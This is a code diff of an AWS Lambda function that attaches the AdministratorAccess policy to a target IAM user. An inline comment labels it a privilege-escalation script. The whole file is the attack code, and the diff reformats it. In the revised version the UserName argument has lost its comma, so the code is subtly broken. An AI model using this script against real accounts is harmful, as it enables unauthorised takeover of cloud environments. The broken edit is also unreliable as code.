@@ -5,14 +5,12 @@ import boto3
 
 def lambda_handler(event, context):
 
-client = boto3.client(‘iam’)
+    client = boto3.client('iam')
 
-response = client.attach_user_policy(
+    response = client.attach_user_policy(
 
-UserName=’EXAMPLE_USERNAME’, #PUT TARGET USER TO PRIV ESC HERE - USERNAME NOT ARN
+    UserName='EXAMPLE_USERNAME' #PUT TARGET USER TO PRIV ESC HERE - USERNAME NOT ARN
 
-PolicyArn=’ arn:aws:iam::aws:policy/AdministratorAccess’
+    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
 
-)
-
-return response  
+    return response
